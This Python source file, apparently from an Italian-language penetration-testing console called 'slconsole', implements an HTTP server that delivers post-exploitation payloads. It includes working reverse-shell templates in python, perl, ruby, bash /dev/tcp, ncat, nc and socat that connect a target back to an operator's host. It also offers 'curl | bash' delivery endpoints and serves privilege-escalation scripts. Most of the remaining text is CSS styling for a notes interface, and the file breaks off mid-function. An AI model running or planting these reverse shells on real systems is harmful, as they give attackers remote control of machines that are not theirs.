"""Quick-Delivery HTTP Server per slconsole.

Server HTTP in background che serve utility di post-exploitation:
  - Endpoint dinamici (/upgrade, /rev, /sh) che generano payload al volo
  - File statici dalla cartella static/ (linpeas.sh, winpeas.exe, ecc.)
  - Piattaforma web SLWeb per consultare notes, vuln e tools
"""
from __future__ import annotations

import html
import base64
import http.server
import io
import json
import os
import random
import re
import socket
import socketserver
import shutil
import subprocess
import threading
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
STATIC_ROOT = PROJECT_ROOT / "static"
VULN_ROOT = PROJECT_ROOT / "vuln"
NOTES_ROOT = PROJECT_ROOT / "notes"
TOOL_ROOT = PROJECT_ROOT / "tool"
LOOT_ROOT = PROJECT_ROOT / "loot"
TIPS_FILE = PROJECT_ROOT / "assets" / "tips.txt"
SEALSAY_FILE = PROJECT_ROOT / "assets" / "sealion_say.txt"
PENTEST_QUESTIONS_FILE = PROJECT_ROOT / "data" / "pentest_questions.json"

_VERSION_FILE = PROJECT_ROOT / "VERSION"
_SL_VERSION = _VERSION_FILE.read_text(encoding="utf-8").strip() if _VERSION_FILE.exists() else "0.0.0"

def _sl_version_hash() -> str:
    import subprocess as _sp
    try:
        sha = _sp.check_output(
            ["git", "rev-parse", "--short=8", "HEAD"],
            cwd=PROJECT_ROOT, stderr=_sp.DEVNULL,
        ).decode().strip()
    except Exception:
        sha = "unknown"
    return f"{_SL_VERSION}-{sha}"

_server: socketserver.TCPServer | None = None
_thread: threading.Thread | None = None
_lhost: str = ""
_lport: int = 2727
_srv_port: int = 2727

_log_entries: list[dict[str, str]] = []
_log_lock = threading.Lock()
_LOG_MAX = 500

# ---------------------------------------------------------------------------
# Catch — OOB listener state
# ---------------------------------------------------------------------------
_catch_servers: dict[str, dict] = {}
_catch_lock = threading.Lock()
_CATCH_LOG_MAX = 500
_catch_tokens: list[str] = []


def parsed_query_flags(raw_path: str) -> str:
    q = raw_path.split("?", 1)[1] if "?" in raw_path else ""
    return q.split("&")[0].split("=")[0] if q else ""


def set_lport(port: int) -> str:
    global _lport
    if not (1 <= port <= 65535):
        return f"Porta non valida: {port} (1-65535)"
    _lport = port
    return f"LPORT aggiornato a {_lport}"


def set_port(port: int) -> str:
    global _srv_port
    if not (1 <= port <= 65535):
        return f"Porta non valida: {port} (1-65535)"
    _srv_port = port
    if _server is not None:
        stop()
        return start(port=_srv_port, lhost=_lhost)
    return f"Porta server aggiornata a {_srv_port} (effettiva al prossimo avvio)"


def get_default_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def discover_interfaces() -> list[tuple[str, str]]:
    """Return list of (interface_name, ipv4_address) for non-loopback interfaces."""
    results: list[tuple[str, str]] = []
    try:
        out = subprocess.run(
            ["ip", "-4", "-o", "addr", "show"],
            capture_output=True, text=True, timeout=5,
        )
        for line in out.stdout.strip().splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                addr = parts[3].split("/")[0]
                if addr != "127.0.0.1":
                    results.append((iface, addr))
    except Exception:
        fallback = get_default_ip()
        if fallback != "127.0.0.1":
            results.append(("default", fallback))
    return results


UPGRADE_TEMPLATE = r"""#!/bin/bash
# === slconsole shell upgrade ===
# Apre una nuova reverse shell con TTY verso {lhost}:{lport}

# Metodo 1: python3 — full PTY (preferito)
if command -v python3 >/dev/null 2>&1; then
    echo "[+] python3 trovato — reverse shell PTY..."
    python3 -c '
import pty,socket,os,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
os.environ["TERM"]="xterm-256color"
pty.spawn("/bin/bash")
' &
    exit 0
fi

# Metodo 2: python2
if command -v python >/dev/null 2>&1; then
    echo "[+] python trovato — reverse shell PTY..."
    python -c '
import pty,socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
os.environ["TERM"]="xterm-256color"
pty.spawn("/bin/bash")
' &
    exit 0
fi

# Metodo 3: perl
if command -v perl >/dev/null 2>&1; then
    echo "[+] perl trovato — reverse shell..."
    perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in({lport},inet_aton("{lhost}")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/bash -i");
' &
    exit 0
fi

# Metodo 4: ruby
if command -v ruby >/dev/null 2>&1; then
    echo "[+] ruby trovato — reverse shell..."
    ruby -rsocket -e '
s=TCPSocket.new("{lhost}",{lport})
[0,1,2].each{{|fd| IO.new(s.fileno).tap{{|io| io.reopen(IO.new(fd))}} rescue nil}}
$stdin.reopen(s);$stdout.reopen(s);$stderr.reopen(s)
exec("/bin/bash -i")
' &
    exit 0
fi

# Metodo 5: bash /dev/tcp (no PTY ma quasi sempre disponibile)
if [ -e /dev/tcp ] || bash -c 'echo' 2>/dev/null; then
    echo "[+] bash /dev/tcp — reverse shell..."
    bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &
    exit 0
fi

# Metodo 6: ncat (da nmap)
if command -v ncat >/dev/null 2>&1; then
    echo "[+] ncat trovato — reverse shell..."
    ncat {lhost} {lport} -e /bin/bash &
    exit 0
fi

# Metodo 7: nc con -e (non tutte le versioni lo supportano)
if command -v nc >/dev/null 2>&1; then
    nc -h 2>&1 | grep -q '\-e' && {{
        echo "[+] nc -e trovato — reverse shell..."
        nc {lhost} {lport} -e /bin/bash &
        exit 0
    }}
fi

# Metodo 8: socat (se disponibile localmente)
if command -v socat >/dev/null 2>&1; then
    echo "[+] socat trovato — reverse shell TTY..."
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
    exit 0
fi

echo "[-] Nessun metodo disponibile per l'upgrade."
echo "    Usa /upgrade2 per upgrade in-place (senza nuova connessione)."
exit 1
"""

UPGRADE2_TEMPLATE = r"""#!/bin/bash
# === slconsole in-place shell upgrade ===
# Upgrada la shell corrente a TTY interattiva senza aprire nuove connessioni.
# Frecce, tab, Ctrl+C, history — tutto funziona.

echo "[*] Upgrade in-place della shell corrente..."

# Metodo 1: python3 — full PTY con raw mode + resize
if command -v python3 >/dev/null 2>&1; then
    echo "[+] python3 trovato — spawning full TTY..."
    python3 -c '
import pty,os,sys,select,termios,tty,struct,fcntl,signal
old=termios.tcgetattr(sys.stdin)
try:
    pid,fd=pty.fork()
    if pid==0:
        os.environ["TERM"]=os.environ.get("TERM","xterm-256color")
        os.execvp("/bin/bash",["/bin/bash","-i"])
    def resize(s=None,f=None):
        try:
            w=struct.pack("HHHH",0,0,0,0)
            r=fcntl.ioctl(sys.stdout,termios.TIOCGWINSZ,w)
            fcntl.ioctl(fd,termios.TIOCSWINSZ,r)
        except:pass
    signal.signal(signal.SIGWINCH,resize)
    resize()
    tty.setraw(sys.stdin)
    while True:
        r,_,_=select.select([sys.stdin,fd],[],[])
        if sys.stdin in r:
            d=os.read(sys.stdin.fileno(),1024)
            if not d:break
            os.write(fd,d)
        if fd in r:
            d=os.read(fd,1024)
            if not d:break
            os.write(sys.stdout.fileno(),d)
except:pass
finally:termios.tcsetattr(sys.stdin,termios.TCSADRAIN,old)
'
    exit 0
fi

# Metodo 2: python2 — stesso approccio
if command -v python >/dev/null 2>&1; then
    echo "[+] python trovato — spawning full TTY..."
    python -c '
import pty,os,sys,select,termios,tty,struct,fcntl,signal
old=termios.tcgetattr(sys.stdin)
try:
    pid,fd=pty.fork()
    if pid==0:
        os.environ["TERM"]=os.environ.get("TERM","xterm-256color")
        os.execvp("/bin/bash",["/bin/bash","-i"])
    def resize(s=None,f=None):
        try:
            w=struct.pack("HHHH",0,0,0,0)
            r=fcntl.ioctl(sys.stdout,termios.TIOCGWINSZ,w)
            fcntl.ioctl(fd,termios.TIOCSWINSZ,r)
        except:pass
    signal.signal(signal.SIGWINCH,resize)
    resize()
    tty.setraw(sys.stdin)
    while True:
        r,_,_=select.select([sys.stdin,fd],[],[])
        if sys.stdin in r:
            d=os.read(sys.stdin.fileno(),1024)
            if not d:break
            os.write(fd,d)
        if fd in r:
            d=os.read(fd,1024)
            if not d:break
            os.write(sys.stdout.fileno(),d)
except:pass
finally:termios.tcsetattr(sys.stdin,termios.TCSADRAIN,old)
'
    exit 0
fi

# Metodo 3: script (frecce funzionano, meno controllo)
if command -v script >/dev/null 2>&1; then
    echo "[+] script trovato — spawning TTY..."
    SHELL=/bin/bash script -qc /bin/bash /dev/null
    exit 0
fi

# Metodo 4: expect
if command -v expect >/dev/null 2>&1; then
    echo "[+] expect trovato — spawning TTY..."
    expect -c 'spawn /bin/bash; interact'
    exit 0
fi

# Metodo 5: perl
if command -v perl >/dev/null 2>&1; then
    echo "[+] perl trovato — spawning shell..."
    perl -e 'exec "/bin/sh";'
    exit 0
fi

# Metodo 6: ruby
if command -v ruby >/dev/null 2>&1; then
    echo "[+] ruby trovato — spawning shell..."
    ruby -e 'exec "/bin/sh"'
    exit 0
fi

# Metodo 7: lua
if command -v lua >/dev/null 2>&1; then
    echo "[+] lua trovato — spawning shell..."
    lua -e 'os.execute("/bin/sh")'
    exit 0
fi

# Metodo 8: awk
if command -v awk >/dev/null 2>&1; then
    echo "[+] awk trovato — spawning shell..."
    awk 'BEGIN {system("/bin/sh")}'
    exit 0
fi

# Metodo 9: /bin/sh -i (ultimo tentativo)
if [ -x /bin/sh ]; then
    echo "[+] fallback a /bin/sh -i..."
    /bin/sh -i
    exit 0
fi

echo "[-] Nessun metodo disponibile per l'upgrade in-place."
echo "    Usa /upgrade per upgrade via nuova connessione socat."
exit 1
"""

REVSHELL_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"

REVSHELL_PYTHON = (
    "python3 -c 'import socket,subprocess,os;"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    's.connect(("{lhost}",{lport}));'
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/bash\",\"-i\"])'\n"
)

INDEX_TEMPLATE = """<!DOCTYPE html>
<html><head><title>slconsole delivery</title></head><body>
<h2>slconsole — Quick Delivery Server</h2>
<h3>Endpoint dinamici</h3>
<ul>
  <li><code>curl {base}/upgrade | bash</code> — Upgrade shell (socat/python pty)</li>
  <li><code>curl {base}/upgrade2 | bash</code> — Upgrade in-place (no nuova connessione)</li>
  <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
  <li><code>curl {base}/sh</code> — Reverse shell Python</li>
</ul>
<h3>File statici</h3>
<ul>
{file_list}
</ul>
<p><em>LHOST: {lhost} | LPORT: {lport}</em></p>
</body></html>
"""


# ---------------------------------------------------------------------------
# Web UI — Piattaforma per consultare notes, vuln, tools
# ---------------------------------------------------------------------------

_CSS = """\
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
:root{--bg:#0d1117;--surface:#151b23;--surface2:#1c2333;--border:#2a3142;
--text:#c9d1d9;--text2:#6e7681;--accent:#58a6ff;--accent2:#79c0ff;
--green:#3fb950;--green2:#56d364;--red:#f85149;--yellow:#d29922;
--code-bg:#0d1117;--hover:#1c2333;--glow:0 0 20px rgba(88,166,255,.08)}
body{font-family:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh;font-size:14px}
a{color:var(--accent);text-decoration:none}a:hover{color:var(--accent2)}
::selection{background:var(--accent);color:var(--bg)}

/* Topbar */
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
padding:10px 24px;display:flex;align-items:center;justify-content:space-between;
position:sticky;top:0;z-index:10}
.topbar-left{display:flex;align-items:center;gap:20px}
.topbar .logo{font-size:16px;font-weight:700;color:var(--text);display:flex;
align-items:center;gap:8px}
.topbar .logo .prompt{color:var(--green);font-weight:700}
.topbar nav{display:flex;gap:2px;align-items:center}
.topbar nav>a{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
transition:all .15s;font-weight:500}
.topbar nav>a:hover{background:var(--hover);color:var(--text)}
.topbar nav>a.active{color:var(--accent);background:rgba(88,166,255,.1)}
.nav-drop{position:relative}
.nav-drop>.nav-drop-btn{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
transition:all .15s;font-weight:500;cursor:pointer;user-select:none}
.nav-drop:hover>.nav-drop-btn,.nav-drop>.nav-drop-btn.active{background:var(--hover);color:var(--text)}
.nav-drop>.nav-drop-btn.active{color:var(--accent);background:rgba(88,166,255,.1)}
.nav-drop-menu{display:none;position:absolute;top:100%;left:0;background:var(--surface);
border:1px solid var(--border);border-radius:6px;padding:4px 0;min-width:150px;
box-shadow:0 4px 12px rgba(0,0,0,.3);z-index:20;margin-top:2px}
.nav-drop:hover .nav-drop-menu{display:block}
.nav-drop-menu a{display:block;padding:7px 16px;font-size:13px;color:var(--text2);
font-weight:500;transition:all .15s}
.nav-drop-menu a:hover{background:var(--hover);color:var(--text)}
.nav-drop-menu a.active{color:var(--accent)}

/* Home layout */
.home-layout{display:grid;grid-template-columns:220px 1fr;gap:0;
min-height:calc(100vh - 45px)}

.sidebar{display:flex;flex-direction:column;gap:0;
background:var(--surface);border-right:1px solid var(--border);padding:16px}
.info-box{padding:12px 0;font-size:13px;border-bottom:1px solid var(--border)}
.info-box:last-child{border-bottom:none}
.info-box .label{color:var(--text2);font-size:11px;text-transform:uppercase;
letter-spacing:.5px;margin-bottom:4px;font-weight:600}
.info-box .value{color:var(--text);font-weight:500}
.info-box a{color:var(--accent);font-weight:500;font-size:12px;word-break:break-all}
.cat-list{list-style:none;margin-top:4px}
.cat-list li{padding:3px 0;display:flex;justify-content:space-between}
.cat-list li a{color:var(--text);font-weight:500}
.cat-list li a:hover{color:var(--accent)}
.cat-list .cnt{color:var(--text2);font-size:12px}

.main-area{padding:24px 32px;display:flex;flex-direction:column;min-height:0}

/* Sealsay — bubble on the right of the art */
.seal-container{flex:1;display:flex;flex-direction:column;align-items:center;
justify-content:center}
.seal-scene{display:flex;align-items:flex-start;gap:0;position:relative}
.seal-art{color:var(--text2);font-size:11px;line-height:1.2;white-space:pre;
flex-shrink:0;cursor:pointer;user-select:none;-webkit-user-select:none}
.seal-bubble-wrap{display:flex;flex-direction:column;justify-content:flex-start;
padding-top:0}
.seal-bubble{border:1px solid var(--border);border-radius:4px;padding:12px 16px;
font-size:13px;color:var(--text);max-width:480px;position:relative;
background:var(--surface2);margin-left:4px}
.seal-bubble::before{content:'';position:absolute;left:-7px;top:14px;
width:12px;height:12px;background:var(--surface2);border-left:1px solid var(--border);
border-bottom:1px solid var(--border);transform:rotate(45deg)}

/* Terminal input */
.terminal-input{margin-top:auto;padding-top:16px;font-size:13px;
border-top:1px solid var(--border);position:relative}
.terminal-input .prompt-line{display:flex;align-items:center;gap:0}
.terminal-input .user{color:var(--green)}
.terminal-input .path{color:var(--accent)}
.terminal-input input{background:none;border:none;color:var(--text);
font-family:inherit;font-size:13px;outline:none;flex:1;caret-color:var(--accent);
padding:0;margin-left:4px;min-width:0}
.terminal-input input::placeholder{color:var(--text2)}
/* Terminal output */
#term-output{font-size:13px;line-height:1.7;max-height:340px;overflow-y:auto;
padding-bottom:6px;white-space:pre-wrap;word-break:break-word}
#term-output .t-prompt{color:var(--green)}
#term-output .t-cmd{color:var(--text)}
#term-output .t-line{color:var(--text2)}
#term-output .t-accent{color:var(--accent)}
#term-output .t-grn{color:var(--green)}
#term-output .t-head{color:var(--accent);font-weight:600}
#term-output .t-section{color:var(--green);font-weight:700;text-transform:uppercase;font-size:11px;letter-spacing:1px}
#term-output .t-entry{margin:1px 0}
.suggestions{position:absolute;bottom:100%;left:0;right:0;
background:var(--surface);border:1px solid var(--border);border-radius:4px;
margin-bottom:4px;display:none;overflow:hidden}
.suggestions.open{display:block}
.suggestions .sug{padding:8px 14px;font-size:13px;cursor:pointer;
display:flex;justify-content:space-between;color:var(--text);transition:background .1s}
.suggestions .sug:hover,.suggestions .sug.active{background:var(--hover)}
.suggestions .sug .sug-name{color:var(--accent);font-weight:600}
.suggestions .sug .sug-cnt{color:var(--text2);font-size:12px}

/* Inner pages */
.container{max-width:900px;margin:0 auto;padding:32px 24px 80px}

.page-title{font-size:22px;font-weight:700;margin-bottom:6px;
display:flex;align-items:center;gap:10px}
.page-title::before{content:'>';color:var(--green);font-weight:700}
.page-sub{color:var(--text2);font-size:12px;margin-bottom:24px}

.item-list{list-style:none}
.item-list li{border-bottom:1px solid var(--border)}
.item-list li a{display:flex;align-items:baseline;gap:8px;padding:12px 14px;
color:var(--text);font-size:14px;transition:background .1s;border-radius:4px}
.item-list li a:hover{background:var(--hover)}
.item-list li a .item-name{font-weight:600;color:var(--accent)}
.item-list li a .item-desc{color:var(--text2);font-size:12px}

.breadcrumb{font-size:12px;color:var(--text2);margin-bottom:18px;
display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.breadcrumb a{color:var(--text2)}
.breadcrumb a:hover{color:var(--accent)}
.breadcrumb span{color:var(--text2)}

/* Markdown */
.md-content{font-size:14px;line-height:1.75}
.md-content h1{font-size:26px;font-weight:700;margin:28px 0 10px;
border-bottom:1px solid var(--border);padding-bottom:8px;color:var(--text)}
.md-content h2{font-size:20px;font-weight:600;margin:24px 0 8px;
border-bottom:1px solid var(--border);padding-bottom:6px;color:var(--text)}
.md-content h3{font-size:16px;font-weight:600;margin:20px 0 6px;color:var(--accent)}
.md-content p{margin:8px 0}
.md-content ul,.md-content ol{margin:8px 0 8px 20px}
.md-content li{margin:3px 0}
.md-content code{background:var(--surface2);padding:2px 6px;border-radius:3px;
font-size:12.5px;font-family:inherit;border:1px solid var(--border);color:var(--accent2)}
.md-content pre{background:var(--code-bg);border:1px solid var(--border);
border-radius:6px;padding:14px;overflow-x:auto;margin:14px 0}
.md-content pre code{background:none;border:none;padding:0;font-size:12.5px;
color:var(--text)}
.md-content blockquote{border-left:2px solid var(--accent);padding:6px 14px;
margin:10px 0;background:var(--surface);border-radius:0 4px 4px 0;color:var(--text2)}
.md-content table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13px}
.md-content th,.md-content td{border:1px solid var(--border);padding:8px 12px;
text-align:left}
.md-content th{background:var(--surface);font-weight:600;color:var(--accent);
font-size:12px;text-transform:uppercase;letter-spacing:.3px}
.md-content tr:nth-child(even) td{background:rgba(255,255,255,.01)}
.md-content tr:hover td{background:var(--hover)}
.md-content hr{border:none;border-top:1px solid var(--border);margin:20px 0}
.md-content strong{color:#fff;font-weight:600}
.md-content a{color:var(--accent)}

/* Table scroll wrapper (injected by JS) */
.table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
.table-scroll table{margin:0}

/* Static / files */
.file-card{background:var(--surface);border:1px solid var(--border);
border-radius:6px;padding:12px 16px;margin:6px 0;display:flex;
align-items:center;justify-content:space-between;transition:border-color .15s}
.file-card:hover{border-color:var(--accent)}
.file-card .fname{font-weight:600;font-size:13px;color:var(--accent)}
.file-card .fsize{color:var(--text2);font-size:12px}
.file-card .fcmd{font-size:11px;color:var(--text2);word-break:break-all}
.file-card .actions{display:flex;gap:6px;margin-left:12px;flex-shrink:0}

.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:4px;
font-size:12px;cursor:pointer;border:1px solid var(--border);background:var(--surface);
color:var(--text);transition:all .15s;text-decoration:none;font-family:inherit}
.btn:hover{background:var(--hover);border-color:var(--accent)}
.btn-primary{background:var(--accent);color:var(--bg);border-color:var(--accent);
font-weight:600}
.btn-primary:hover{background:var(--accent2)}
.btn-danger{color:var(--red);border-color:rgba(248,81,73,.4)}
.btn-danger:hover{background:rgba(248,81,73,.1)}
.btn-group{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}

.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;
align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:8px;
padding:24px;width:90%;max-width:520px}
.modal h3{margin-bottom:14px;font-size:16px;color:var(--text);display:flex;
align-items:center;gap:8px}
.modal h3::before{content:'>';color:var(--green)}
.modal input[type=text],.modal textarea{width:100%;padding:10px 12px;border-radius:4px;
border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;
font-family:inherit;margin-bottom:10px}
.modal textarea{min-height:180px;resize:vertical}
.modal .modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:6px}

.editor-wrap{margin-top:16px}
.editor-wrap textarea{width:100%;min-height:400px;padding:14px;border-radius:6px;
border:1px solid var(--border);background:var(--code-bg);color:var(--text);
font-family:inherit;font-size:13px;line-height:1.6;resize:vertical}
.editor-topbar{display:flex;align-items:center;justify-content:space-between;
margin-bottom:10px}
.editor-topbar .fname{font-size:16px;font-weight:700;color:var(--accent)}
.save-status{font-size:12px;color:var(--text2);margin-left:12px}

/* Search bar */
.topbar-right{display:flex;align-items:center;gap:10px}
.version-tag{font-size:11px;color:var(--text2);opacity:.6;white-space:nowrap}
.search-box{position:relative}
.search-box input{background:var(--bg);border:1px solid var(--border);border-radius:4px;
padding:5px 12px;color:var(--text);font-family:inherit;font-size:12px;width:220px;
outline:none;transition:border-color .15s}
.search-box input:focus{border-color:var(--accent)}
.search-box input::placeholder{color:var(--text2)}
.search-results{position:absolute;top:100%;right:0;width:380px;max-height:420px;
overflow-y:auto;background:var(--surface);border:1px solid var(--border);
border-radius:6px;margin-top:6px;display:none;z-index:20;
box-shadow:0 8px 24px rgba(0,0,0,.4)}
.search-results.open{display:block}
.sr-item{display:flex;flex-direction:column;gap:2px;padding:10px 14px;
color:var(--text);text-decoration:none;border-bottom:1px solid var(--border);
transition:background .1s}
.sr-item:last-child{border-bottom:none}
.sr-item:hover{background:var(--hover)}
.sr-tag{font-size:10px;text-transform:uppercase;letter-spacing:.5px;
color:var(--green);font-weight:600}
.sr-name{font-size:13px;font-weight:600;color:var(--accent)}
.sr-ctx{font-size:11px;color:var(--text2);white-space:nowrap;overflow:hidden;
text-overflow:ellipsis}
.sr-empty{padding:16px;text-align:center;color:var(--text2);font-size:13px}
mark{background:rgba(88,166,255,.25);color:inherit;border-bottom:2px solid var(--accent);
padding:0 1px;border-radius:2px}
.search-hl{background:rgba(88,166,255,.25);border-bottom:2px solid var(--accent);
padding:0 1px;border-radius:2px;scroll-margin-top:80px}

/* Search results page */
.search-page-item{background:var(--surface);border:1px solid var(--border);
border-radius:6px;padding:14px 18px;margin:8px 0;transition:border-color .15s}
.search-page-item:hover{border-color:var(--accent)}
.search-page-item a{text-decoration:none}
.search-page-item .sp-header{display:flex;align-items:center;gap:10px;margin-bottom:4px}
.search-page-item .sp-tag{font-size:10px;text-transform:uppercase;letter-spacing:.5px;
padding:2px 8px;border-radius:3px;font-weight:600}
.search-page-item .sp-tag.notes{background:rgba(88,166,255,.15);color:var(--accent)}
.search-page-item .sp-tag.vuln{background:rgba(248,81,73,.15);color:var(--red)}
.search-page-item .sp-tag.tools{background:rgba(63,185,80,.15);color:var(--green)}
.search-page-item .sp-name{font-size:15px;font-weight:600;color:var(--accent)}
.search-page-item .sp-ctx{font-size:12px;color:var(--text2);margin-top:4px;
line-height:1.5}

/* Logs */
.log-table-wrap{max-height:65vh;overflow-y:auto;border:1px solid var(--border);
border-radius:6px;background:var(--bg)}

/* Delivery */
.delivery-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;
padding:16px 20px;margin:10px 0;transition:border-color .15s}
.delivery-card:hover{border-color:var(--accent)}
.dc-header{display:flex;align-items:center;gap:10px;margin-bottom:6px}
.dc-endpoint{background:rgba(88,166,255,.15);color:var(--accent);font-weight:700;
padding:2px 10px;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:14px}
.dc-title{font-weight:600;color:var(--text);font-size:15px}
.dc-desc{color:var(--text2);font-size:13px;margin-bottom:8px}
.dc-cmd{background:var(--bg);border:1px solid var(--border);border-radius:4px;
padding:8px 12px;font-size:13px;font-family:'JetBrains Mono',monospace;margin-bottom:6px;
overflow-x:auto}
.dc-cmd code{color:var(--green)}
.dc-prereq{font-size:11px;color:var(--text2)}
.dc-prereq code{color:var(--yellow);font-size:11px}
.dc-fname{font-weight:600;color:var(--accent)}
.dc-fsize{color:var(--text2);white-space:nowrap}
.dc-fcmd code{color:var(--green);font-size:12px}
.log-table{width:100%;border-collapse:collapse;font-size:13px;font-family:'JetBrains Mono',monospace}
.log-table thead{position:sticky;top:0;background:var(--surface);z-index:1}
.log-table th{text-align:left;padding:8px 12px;font-weight:600;color:var(--text2);
border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase;letter-spacing:.5px}
.log-table td{padding:6px 12px;border-bottom:1px solid rgba(110,118,129,.15);
vertical-align:top;word-break:break-all}
.log-ts{color:var(--text2);font-size:12px;white-space:nowrap}
.log-client{color:var(--accent);font-weight:600;white-space:nowrap}
.log-msg{color:var(--text)}
.log-table tbody tr:hover{background:var(--hover)}

/* ===== MOBILE RESPONSIVE ===== */
@media(max-width:768px){
  body{font-size:13px}
  .topbar{padding:8px 12px;flex-wrap:wrap;gap:8px}
  .topbar-left{gap:10px;flex-wrap:wrap;width:100%}
  .topbar .logo{font-size:14px}
  .topbar nav{gap:0;flex-wrap:wrap}
  .topbar nav>a,.nav-drop>.nav-drop-btn{font-size:12px;padding:6px 10px}
  .home-layout{display:flex;flex-direction:column;min-height:auto}
  .main-area{order:1;padding:16px;min-height:calc(100dvh - 92px)}
  .sidebar{order:2;border-right:none;border-top:1px solid var(--border);border-bottom:none;padding:12px 16px}
  .seal-container{min-height:0}
  .seal-scene{flex-direction:column;align-items:center}
  .seal-art{font-size:clamp(7.5px,2.35vw,9.7px);line-height:1.1;align-self:center}
  .seal-bubble-wrap{padding-top:8px;width:100%}
  .seal-bubble{margin-left:0;max-width:100%;font-size:12px}
  .seal-bubble::before{display:none}
  .terminal-input{padding-top:12px}
  .terminal-input .prompt-line{font-size:12px}
  .terminal-input input{font-size:14px;min-height:36px}
  .suggestions .sug{padding:12px 14px;min-height:44px}
  .container{padding:16px 12px 60px}
  .page-title{font-size:18px}
  .item-list li a{padding:14px 12px;flex-direction:column;gap:4px}
  .item-list li a .item-desc{font-size:11px}
  .md-content{font-size:13px}
  .md-content h1{font-size:20px}
  .md-content h2{font-size:17px}
  .md-content h3{font-size:14px}
  .md-content pre{padding:10px;font-size:11px}
  .md-content code{font-size:11px}
  .md-content th,.md-content td{padding:6px 8px;font-size:11px}
  .file-card{flex-direction:column;align-items:flex-start;gap:8px;padding:12px}
  .file-card .actions{margin-left:0;width:100%}
  .file-card .actions .btn{flex:1;justify-content:center;padding:8px 12px}
  .file-card .fsize{margin:0}
  .btn{padding:8px 14px;font-size:13px;min-height:40px}
  .btn-group{gap:6px}
  .modal{padding:16px;width:95%}
  .modal textarea{min-height:140px}
  .editor-wrap textarea{min-height:250px;font-size:12px}
  .editor-topbar{flex-direction:column;align-items:flex-start;gap:8px}
  .editor-topbar .fname{font-size:14px}
  .breadcrumb{font-size:11px}
  .search-box input{width:100%;font-size:14px;padding:8px 12px}
  .topbar-right{width:100%;order:3}
  .search-box{width:100%}
  .search-results{width:100%;left:0;right:0}
  .search-page-item{padding:12px}
  .search-page-item .sp-name{font-size:14px}
}
@media(max-width:400px){
  .topbar nav>a,.nav-drop>.nav-drop-btn{font-size:11px;padding:5px 7px}
  .seal-art{font-size:clamp(8.2px,2.68vw,10px)}
  .container{padding:12px 8px 40px}
}
"""

_JS_MARKED = "https://cdn.jsdelivr.net/npm/marked@15/marked.min.js"
_JS_HLJS = "https://cdn.jsdelivr.net/npm/highlight.js@11/lib/highlight.min.js"
_CSS_HLJS = "https://cdn.jsdelivr.net/npm/highlight.js@11/styles/github-dark.min.css"


def _load_tips() -> list[str]:
    if TIPS_FILE.exists():
        return [l for l in TIPS_FILE.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
    return ["SeaLion Console"]


def _trim_ascii_frame(content: str) -> str:
    """Remove blank padding rows without changing the art indentation."""
    lines = content.splitlines()
    while lines and not lines[0].strip():
        lines.pop(0)
    while lines and not lines[-1].strip():
        lines.pop()
    return "\n".join(lines)


def _load_seal_art() -> str:
    if SEALSAY_FILE.exists():
        return _trim_ascii_frame(SEALSAY_FILE.read_text(encoding="utf-8", errors="replace"))
    return ""


def _load_wag_frames() -> list[str]:
    base = _load_seal_art()
    names = ["SL-2", "SL-1", "SL0", "SL1", "SL2"]
    frames = []
    for n in names:
        fp = PROJECT_ROOT / "assets" / f"{n}.txt"
        if fp.exists():
            frames.append(_trim_ascii_frame(fp.read_text(encoding="utf-8", errors="replace")))
        else:
            frames.append(base)
    return frames


def _load_bark_frames() -> list[str]:
    frames = []
    for n in ["SLmouth1", "SLmouth2"]:
        fp = PROJECT_ROOT / "assets" / f"{n}.txt"
        if fp.exists():
            frames.append(_trim_ascii_frame(fp.read_text(encoding="utf-8", errors="replace")))
        else:
            frames.append(_load_seal_art())
    return frames


def _parse_fish_art() -> list[str]:
    fp = PROJECT_ROOT / "assets" / "fish.txt"
    if not fp.exists():
        return []
    content = fp.read_text(encoding="utf-8", errors="replace")
    chunks = re.split(r"^.*\+\d+%\s*food.*$", content, flags=re.MULTILINE)
    arts = []
    for chunk in chunks:
        art = chunk.strip()
        if art and len(art) > 2:
            arts.append(art)
    return arts


def _discover_notes() -> list[tuple[str, str]]:
